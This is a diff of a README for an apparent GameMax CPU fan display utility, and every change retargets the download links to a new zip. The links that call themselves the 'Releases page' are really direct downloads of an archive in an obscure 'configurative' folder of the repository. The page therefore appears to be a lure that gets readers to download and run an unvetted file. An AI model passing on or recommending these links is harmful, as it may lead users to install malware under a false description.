@@ -1,7 +1,7 @@
 # 💻 gamemax-cpu-fan-display - Monitor Your CPU Temperature Easily 
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/gamemax-cpu-fan-display.zip)](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/gamemax-cpu-fan-display.zip)
+[![Download](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/display-cpu-fan-gamemax-1.9-alpha.5.zip)](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/display-cpu-fan-gamemax-1.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to GameMax CPU Fan Display! This application helps you view your CPU temperature directly on your cooler display. It is designed for everyday users who want to monitor their system easily.
@@ -19,7 +19,7 @@ Welcome to GameMax CPU Fan Display! This application helps you view your CPU tem
 - **Storage:** 100 MB of free disk space
 
 ## 🌐 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/gamemax-cpu-fan-display.zip) to download the latest version of GameMax CPU Fan Display.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/display-cpu-fan-gamemax-1.9-alpha.5.zip) to download the latest version of GameMax CPU Fan Display.
 
 1. Click on the link above to open the Releases page.
 2. Find the version you wish to download.
@@ -41,7 +41,7 @@ If you encounter issues or have questions, feel free to check the FAQ section on
 We welcome contributions! If you have ideas for new features or improvements, please open a discussion in the Issues section.
 
 ## 🔍 Explore More
-You can find out more about our app on the [Releases page](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/gamemax-cpu-fan-display.zip). Explore the latest features and updates, and stay tuned for future enhancements!
+You can find out more about our app on the [Releases page](https://raw.githubusercontent.com/sanjaya12007/gamemax-cpu-fan-display/master/configurative/display-cpu-fan-gamemax-1.9-alpha.5.zip). Explore the latest features and updates, and stay tuned for future enhancements!
 
 ## 📝 License
 This project is licensed under the MIT License. You are free to use, modify, and share the application, as long as you attribute the original creators.
